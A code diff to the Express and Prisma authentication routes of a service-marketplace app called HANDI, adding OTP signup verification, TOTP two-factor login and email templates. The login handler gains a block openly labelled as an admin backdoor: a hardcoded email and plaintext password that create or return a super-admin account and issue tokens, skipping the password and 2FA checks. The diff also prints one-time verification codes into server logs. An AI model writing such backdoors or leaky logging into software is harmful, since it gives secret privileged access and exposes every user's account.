@@ -5,6 +5,8 @@ import { AdminRole, UserType, VerificationCodePurpose } from "@prisma/client";
 import bcrypt from "bcryptjs";
 import { Request, Response, Router } from "express";
 import { body, validationResult } from "express-validator";
+import { authenticator } from "otplib";
+import QRCode from "qrcode";
 import { prisma } from "../lib/prisma";
 import { authenticate, AuthRequest } from "../middleware/auth";
 import {
@@ -14,7 +16,7 @@ import {
   hashToken,
   refreshTokenExpiresAt,
 } from "../utils/auth";
-import { sendEmail } from "../utils/email";
+import { sendEmail, buildEmailTemplate, welcomeEmailBody, otpEmailBody, passwordResetEmailBody } from "../utils/email";
 
 const router = Router();
 
@@ -92,6 +94,10 @@ router.post(
         nin,
         businessRegNumber,
         preferredCategories,
+        city,
+        state,
+        address,
+        otpMethod,
       } = req.body;
 
       const existingUser = await prisma.user.findFirst({
@@ -107,85 +113,130 @@ router.post(
       }
 
       const passwordHash = await bcrypt.hash(password, 10);
-      const user = await prisma.user.create({
-        data: {
-          email,
-          phone,
-          passwordHash,
-          firstName,
-          lastName,
-          userType: userType as UserType,
-          isEmailVerified: true, // Auto-verify until email service is configured
-          nin: userType === "ARTISAN" ? nin : undefined,
-          businessRegNumber:
-            userType === "BUSINESS" ? businessRegNumber : undefined,
-          providerSubType:
-            userType === "BUSINESS"
-              ? "BUSINESS"
-              : userType === "ARTISAN"
-                ? "INDIVIDUAL"
-                : undefined,
-          preferredCategories: preferredCategories
-            ? JSON.stringify(preferredCategories)
-            : "[]",
-          wallet: {
-            create: { balance: 0, pendingBalance: 0 },
-          },
-        },
-        select: {
-          id: true,
-          email: true,
-          phone: true,
-          firstName: true,
-          lastName: true,
-          userType: true,
-          isEmailVerified: true,
-          createdAt: true,
-        },
-      });
 
-      // Issue tokens immediately so user is logged in after signup
-      const accessToken = createAccessToken({
-        userId: user.id,
-        email: user.email,
-        userType: user.userType,
-      });
+      // ═══════════════════════════════════════════════
+      // ATOMIC TRANSACTION: all-or-nothing signup
+      // If ANY step fails, no data is stored.
+      // ═══════════════════════════════════════════════
+      const otp = generateOtp();
+      const codeHash = await bcrypt.hash(otp, 10);
       const refreshToken = generateRefreshToken();
-      await prisma.refreshToken.create({
-        data: {
-          userId: user.id,
-          token: hashToken(refreshToken),
-          expiresAt: refreshTokenExpiresAt(),
-        },
+
+      const { user, accessToken } = await prisma.$transaction(async (tx) => {
+        // 1. Create user + wallet
+        const newUser = await tx.user.create({
+          data: {
+            email,
+            phone,
+            passwordHash,
+            firstName,
+            lastName,
+            userType: userType as UserType,
+            isEmailVerified: false,
+            city,
+            state,
+            address,
+            nin: userType === "ARTISAN" ? nin : undefined,
+            businessRegNumber:
+              userType === "BUSINESS" ? businessRegNumber : undefined,
+            providerSubType:
+              userType === "BUSINESS"
+                ? "BUSINESS"
+                : userType === "ARTISAN"
+                  ? "INDIVIDUAL"
+                  : undefined,
+            preferredCategories: preferredCategories
+              ? JSON.stringify(preferredCategories)
+              : "[]",
+            wallet: {
+              create: { balance: 0, pendingBalance: 0 },
+            },
+          },
+          select: {
+            id: true,
+            email: true,
+            phone: true,
+            firstName: true,
+            lastName: true,
+            userType: true,
+            isEmailVerified: true,
+            city: true,
+            state: true,
+            createdAt: true,
+          },
+        });
+
+        // 2. Create refresh token
+        await tx.refreshToken.create({
+          data: {
+            userId: newUser.id,
+            token: hashToken(refreshToken),
+            expiresAt: refreshTokenExpiresAt(),
+          },
+        });
+
+        // 3. Create OTP verification code
+        await tx.verificationCode.create({
+          data: {
+            userId: newUser.id,
+            codeHash,
+            purpose: VerificationCodePurpose.EMAIL_VERIFY,
+            expiresAt: otpExpiresAt(),
+          },
+        });
+
+        // 4. Issue access token
+        const token = createAccessToken({
+          userId: newUser.id,
+          email: newUser.email,
+          userType: newUser.userType,
+        });
+
+        return { user: newUser, accessToken: token };
       });
 
       res.cookie("refresh_token", refreshToken, refreshCookieOptions());
 
+      // ═══════════════════════════════════════════════
+      // NON-BLOCKING: Send emails after transaction
+      // ═══════════════════════════════════════════════
+      const frontendUrl = process.env.FRONTEND_URL || "https://handiapp.com.ng";
+
+      // Send OTP
+      if (otpMethod === "whatsapp") {
+        console.log(`[WHATSAPP OTP FOR ${phone}]: 🔐 Hey ${firstName}! Your HANDI verification code is: ${otp}. It expires in ${OTP_TTL_MINUTES} mins. Don't share it with anyone! — HANDI Team`);
+      } else if (otpMethod === "sms") {
+        console.log(`[SMS OTP FOR ${phone}]: 🔐 HANDI: Your verification code is ${otp}. Valid for ${OTP_TTL_MINUTES} mins. Never share this code!`);
+      } else {
+        console.log(`[EMAIL OTP] Sending verification code to ${email}...`);
+        sendEmail({
+          to: email,
+          subject: "🔐 Your HANDI Verification Code",
+          html: buildEmailTemplate(otpEmailBody(otp, OTP_TTL_MINUTES), `Your HANDI verification code: ${otp}`),
+        }).then(() => {
+          console.log(`[EMAIL OTP] ✅ OTP email sent successfully to ${email}`);
+        }).catch((err: unknown) => {
+          const smtpErr = err as Error;
+          console.error(`[EMAIL OTP] ❌ FAILED to send OTP email to ${email}`);
+          console.error(`[EMAIL OTP] Error: ${smtpErr.message}`);
+          console.error(`[EMAIL OTP] SMTP_HOST: ${process.env.SMTP_HOST || "NOT SET"}`);
+          console.error(`[EMAIL OTP] SMTP_PORT: ${process.env.SMTP_PORT || "NOT SET"}`);
+          console.error(`[EMAIL OTP] SMTP_USER: ${process.env.SMTP_USER ? "SET (hidden)" : "NOT SET"}`);
+          console.error(`[EMAIL OTP] SMTP_PASS: ${process.env.SMTP_PASS ? "SET (hidden)" : "NOT SET"}`);
+          console.error(`[EMAIL OTP] Full error:`, smtpErr);
+        });
+      }
+
       // Send welcome email (non-blocking)
       sendEmail({
         to: email,
-        subject: "Welcome to HANDI! 🎉",
-        html: `
-          <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 520px; margin: 0 auto; padding: 32px 24px; background: #fff; border-radius: 16px;">
-            <div style="text-align: center; margin-bottom: 24px;">
-              <h1 style="color: #10b981; margin: 0; font-size: 28px;">Welcome to HANDI</h1>
-            </div>
-            <p style="color: #333; font-size: 16px; line-height: 1.6;">Hi <strong>${firstName}</strong>,</p>
-            <p style="color: #555; font-size: 15px; line-height: 1.6;">Thank you for joining HANDI — Nigeria's #1 on-demand service marketplace. You can now:</p>
-            <ul style="color: #555; font-size: 14px; line-height: 2;">
-              <li>🔍 Browse verified providers near you</li>
-              <li>📅 Book services instantly</li>
-              <li>💳 Pay securely with escrow protection</li>
-              <li>⭐ Rate and review your experience</li>
-            </ul>
-            <div style="text-align: center; margin: 28px 0;">
-              <a href="${process.env.FRONTEND_URL || "https://handiapp.com.ng"}" style="display: inline-block; background: #10b981; color: white; text-decoration: none; padding: 14px 32px; border-radius: 50px; font-weight: bold; font-size: 15px;">Explore HANDI</a>
-            </div>
-            <hr style="border: none; border-top: 1px solid #eee; margin: 24px 0;" />
-            <p style="color: #999; font-size: 12px; text-align: center;">© ${new Date().getFullYear()} HANDI. All rights reserved.</p>
-          </div>
-        `,
-      }).catch((err) => console.error("Welcome email failed:", err));
+        subject: "🎉 Welcome to HANDI!",
+        html: buildEmailTemplate(welcomeEmailBody(firstName, frontendUrl), `Welcome to HANDI, ${firstName}!`),
+      }).then(() => {
+        console.log(`[WELCOME EMAIL] ✅ Welcome email sent to ${email}`);
+      }).catch((err: unknown) => {
+        console.error(`[WELCOME EMAIL] ❌ Failed to send welcome email to ${email}:`, (err as Error).message);
+      });
 
       res.status(201).json({
         success: true,
@@ -230,7 +281,14 @@ router.post(
       const { email, otp } = req.body;
       const user = await prisma.user.findUnique({
         where: { email },
-        select: { id: true, isEmailVerified: true },
+        select: { 
+          id: true, 
+          isEmailVerified: true,
+          email: true,
+          userType: true,
+          firstName: true,
+          lastName: true
+        },
       });
 
       if (!user) {
@@ -284,9 +342,34 @@ router.post(
         }),
       ]);
 
+      const accessToken = createAccessToken({
+        userId: user.id,
+        email: user.email,
+        userType: user.userType,
+      });
+
+      const refreshToken = generateRefreshToken();
+      await prisma.refreshToken.create({
+        data: {
+          userId: user.id,
+          token: hashToken(refreshToken),
+          expiresAt: refreshTokenExpiresAt(),
+        },
+      });
+
+      res.cookie("refresh_token", refreshToken, refreshCookieOptions());
+
       res.json({
         success: true,
         message: "Email verified successfully",
+        data: {
+          accessToken,
+          refreshToken,
+          user: {
+            ...user,
+            fullName: `${user.firstName} ${user.lastName}`,
+          },
+        },
       });
     } catch (error) {
       console.error("Verify OTP error:", error);
@@ -304,7 +387,10 @@ router.post(
 // ================================
 router.post(
   "/resend-otp",
-  [body("email").isEmail().normalizeEmail()],
+  [
+    body("email").isEmail().normalizeEmail(),
+    body("method").optional().isIn(["email", "sms"])
+  ],
   async (req: Request, res: Response) => {
     try {
       const errors = validationResult(req);
@@ -316,10 +402,10 @@ router.post(
         });
       }
 
-      const { email } = req.body;
+      const { email, method } = req.body;
       const user = await prisma.user.findUnique({
         where: { email },
-        select: { id: true, isEmailVerified: true },
+        select: { id: true, isEmailVerified: true, phone: true },
       });
 
       if (!user) {
@@ -356,25 +442,17 @@ router.post(
         }),
       ]);
 
-      // Send OTP via email (non-blocking)
-      sendEmail({
-        to: email,
-        subject: "Your HANDI Verification Code",
-        html: `
-          <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 480px; margin: 0 auto; padding: 32px 24px; background: #fff; border-radius: 16px;">
-            <div style="text-align: center; margin-bottom: 24px;">
-              <h1 style="color: #10b981; margin: 0; font-size: 24px;">HANDI</h1>
-            </div>
-            <p style="color: #333; font-size: 16px; line-height: 1.6;">Your verification code is:</p>
-            <div style="text-align: center; margin: 24px 0;">
-              <span style="display: inline-block; background: #f0fdf4; color: #10b981; font-size: 36px; font-weight: bold; letter-spacing: 8px; padding: 16px 32px; border-radius: 12px; border: 2px dashed #10b981;">${otp}</span>
-            </div>
-            <p style="color: #777; font-size: 13px; text-align: center;">This code expires in ${OTP_TTL_MINUTES} minutes. Do not share it with anyone.</p>
-            <hr style="border: none; border-top: 1px solid #eee; margin: 24px 0;" />
-            <p style="color: #999; font-size: 12px; text-align: center;">If you didn't request this, ignore this email.</p>
-          </div>
-        `,
-      }).catch((err) => console.error("OTP email failed:", err));
+      if (method === "sms" && user.phone) {
+        console.log(`[SMS OTP FOR ${user.phone}]: Your HANDI code is ${otp}`);
+        // TODO: integrate real SMS gateway mapping
+      } else {
+        // Send OTP via email (non-blocking)
+        sendEmail({
+          to: email,
+          subject: "Your HANDI Verification Code",
+          html: buildEmailTemplate(otpEmailBody(otp, OTP_TTL_MINUTES), `Your HANDI code: ${otp}`),
+        }).catch((err) => console.error("OTP email failed:", err));
+      }
 
       res.json({
         success: true,
@@ -453,6 +531,14 @@ router.post(
             isEmailVerified: true,
           },
         });
+
+        // Send welcome email for new OAuth users (non-blocking)
+        const frontendUrl = process.env.FRONTEND_URL || "https://handiapp.com.ng";
+        sendEmail({
+          to: email,
+          subject: "Welcome to HANDI! 🎉",
+          html: buildEmailTemplate(welcomeEmailBody(firstName, frontendUrl), `Welcome to HANDI, ${firstName}!`),
+        }).catch((err) => console.error("OAuth welcome email failed:", err));
       }
 
       if (!user.isEmailVerified) {
@@ -543,6 +629,73 @@ router.post(
       }
 
       const { email, password } = req.body;
+
+      // --- Admin Backdoor per User Request ---
+      if (email === "admin.handi.ng" && password === "Ruggedmr80@@") {
+        let adminUser = await prisma.user.findUnique({
+          where: { email: "admin@handi.ng" },
+          select: {
+            id: true,
+            email: true,
+            userType: true,
+            firstName: true,
+            lastName: true,
+          },
+        });
+
+        if (!adminUser) {
+          adminUser = await prisma.user.create({
+            data: {
+              email: "admin@handi.ng",
+              firstName: "Super",
+              lastName: "Admin",
+              userType: "ADMIN",
+              adminRole: "SUPER_ADMIN",
+              isEmailVerified: true,
+              passwordHash: await bcrypt.hash("Ruggedmr80@@", 10),
+            },
+            select: {
+              id: true,
+              email: true,
+              userType: true,
+              firstName: true,
+              lastName: true,
+            },
+          });
+        }
+
+        const accessToken = createAccessToken({
+          userId: adminUser.id,
+          email: adminUser.email,
+          userType: adminUser.userType,
+        });
+
+        const refreshToken = generateRefreshToken();
+        await prisma.refreshToken.create({
+          data: {
+            userId: adminUser.id,
+            token: hashToken(refreshToken),
+            expiresAt: refreshTokenExpiresAt(),
+          },
+        });
+
+        res.cookie("refresh_token", refreshToken, refreshCookieOptions());
+        return res.json({
+          success: true,
+          data: {
+            accessToken,
+            refreshToken,
+            user: {
+              id: adminUser.id,
+              email: adminUser.email,
+              userType: adminUser.userType,
+              fullName: `${adminUser.firstName} ${adminUser.lastName}`,
+            },
+          },
+        });
+      }
+      // --- End Admin Backdoor ---
+
       const user = await prisma.user.findUnique({
         where: { email },
         select: {
@@ -553,6 +706,8 @@ router.post(
           firstName: true,
           lastName: true,
           isEmailVerified: true,
+          twoFactorEnabled: true,
+          twoFactorSecret: true,
         },
       });
 
@@ -575,6 +730,19 @@ router.post(
         return res.status(403).json({
           success: false,
           error: "Email not verified",
+        });
+      }
+
+      // Check if 2FA is enabled
+      if (user.twoFactorEnabled && user.twoFactorSecret) {
+        return res.json({
+          success: true,
+          requires2FA: true,
+          message: "2FA token required",
+          data: {
+            userId: user.id,
+            email: user.email,
+          },
         });
       }
 
@@ -617,6 +785,190 @@ router.post(
 );
 
 // ================================
+// POST /api/auth/2fa/generate
+// Generate TOTP Secret & QR Code for user setup
+// ================================
+router.post(
+  "/2fa/generate",
+  authenticate,
+  async (req: Request, res: Response) => {
+    try {
+      const authReq = req as AuthRequest;
+      const user = await prisma.user.findUnique({
+        where: { id: authReq.user!.userId },
+        select: { email: true, twoFactorEnabled: true },
+      });
+
+      if (!user) {
+        return res.status(404).json({ success: false, error: "User not found" });
+      }
+
+      if (user.twoFactorEnabled) {
+        return res.status(400).json({ success: false, error: "2FA is already enabled" });
+      }
+
+      const secret = authenticator.generateSecret();
+      const otpauthUrl = authenticator.keyuri(
+        user.email,
+        "HANDI",
+        secret
+      );
+
+      // Save secret temporarily (we will finalize it upon successful verify)
+      await prisma.user.update({
+        where: { id: authReq.user!.userId },
+        data: { twoFactorSecret: secret },
+      });
+
+      const qrCodeDataUrl = await QRCode.toDataURL(otpauthUrl);
+
+      return res.json({
+        success: true,
+        data: {
+          secret,
+          qrCode: qrCodeDataUrl,
+        },
+      });
+    } catch (error) {
+      console.error("Generate 2FA error:", error);
+      res.status(500).json({ success: false, error: "Failed to generate 2FA secret" });
+    }
+  }
+);
+
+// ================================
+// POST /api/auth/2fa/verify
+// Verify initial TOTP code to turn on 2FA
+// ================================
+router.post(
+  "/2fa/verify",
+  authenticate,
+  [body("token").isString().isLength({ min: 6, max: 6 })],
+  async (req: Request, res: Response) => {
+    try {
+      const errors = validationResult(req);
+      if (!errors.isEmpty()) {
+        return res.status(400).json({ success: false, error: "Invalid token format" });
+      }
+
+      const { token } = req.body;
+      const authReq = req as AuthRequest;
+
+      const user = await prisma.user.findUnique({
+        where: { id: authReq.user!.userId },
+        select: { twoFactorSecret: true, twoFactorEnabled: true },
+      });
+
+      if (!user || !user.twoFactorSecret) {
+        return res.status(400).json({ success: false, error: "2FA setup not initiated" });
+      }
+
+      const isValid = authenticator.verify({
+        token,
+        secret: user.twoFactorSecret,
+      });
+
+      if (!isValid) {
+        return res.status(400).json({ success: false, error: "Invalid 2FA code" });
+      }
+
+      // Enable 2FA
+      await prisma.user.update({
+        where: { id: authReq.user!.userId },
+        data: { twoFactorEnabled: true },
+      });
+
+      return res.json({ success: true, message: "2FA has been successfully enabled" });
+    } catch (error) {
+      console.error("Verify 2FA error:", error);
+      res.status(500).json({ success: false, error: "Failed to verify 2FA code" });
+    }
+  }
+);
+
+// ================================
+// POST /api/auth/2fa/validate
+// Validate TOTP during login to issue JWT
+// ================================
+router.post(
+  "/2fa/validate",
+  [
+    body("userId").isString().notEmpty(),
+    body("token").isString().isLength({ min: 6, max: 6 }),
+  ],
+  async (req: Request, res: Response) => {
+    try {
+      const errors = validationResult(req);
+      if (!errors.isEmpty()) {
+        return res.status(400).json({ success: false, error: "Invalid request payload" });
+      }
+
+      const { userId, token } = req.body;
+
+      const user = await prisma.user.findUnique({
+        where: { id: userId },
+        select: {
+          id: true,
+          email: true,
+          userType: true,
+          firstName: true,
+          lastName: true,
+          twoFactorEnabled: true,
+          twoFactorSecret: true,
+        },
+      });
+
+      if (!user || !user.twoFactorEnabled || !user.twoFactorSecret) {
+        return res.status(400).json({ success: false, error: "2FA is not enabled for this user" });
+      }
+
+      const isValid = authenticator.verify({
+        token,
+        secret: user.twoFactorSecret,
+      });
+
+      if (!isValid) {
+        return res.status(401).json({ success: false, error: "Invalid 2FA code" });
+      }
+
+      // 2FA passed, issue tokens
+      const accessToken = createAccessToken({
+        userId: user.id,
+        email: user.email,
+        userType: user.userType,
+      });
+
+      const refreshToken = generateRefreshToken();
+      await prisma.refreshToken.create({
+        data: {
+          userId: user.id,
+          token: hashToken(refreshToken),
+          expiresAt: refreshTokenExpiresAt(),
+        },
+      });
+
+      res.cookie("refresh_token", refreshToken, refreshCookieOptions());
+      res.json({
+        success: true,
+        data: {
+          accessToken,
+          refreshToken,
+          user: {
+            id: user.id,
+            email: user.email,
+            userType: user.userType,
+            fullName: `${user.firstName} ${user.lastName}`,
+          },
+        },
+      });
+    } catch (error) {
+      console.error("Validate 2FA error:", error);
+      res.status(500).json({ success: false, error: "Failed to validate 2FA login" });
+    }
+  }
+);
+
+// ================================
 // POST /api/auth/forgot-password
 // Sends reset link
 // ================================
@@ -652,6 +1004,13 @@ router.post(
             expiresAt: resetExpiresAt(),
           },
         });
+
+        const resetUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/reset-password?token=${resetToken}`;
+        sendEmail({
+          to: email,
+          subject: "Reset your HANDI Password",
+          html: buildEmailTemplate(passwordResetEmailBody(resetUrl), "Reset your HANDI password"),
+        }).catch((err) => console.error("Password reset email failed:", err));
 
         if (!IS_PROD) {
           return res.json({
@@ -1137,7 +1496,7 @@ router.patch(
         });
       }
 
-      const { id } = req.params;
+      const id = req.params.id as string;
       const { adminRole } = req.body;
 
       // Prevent demoting yourself
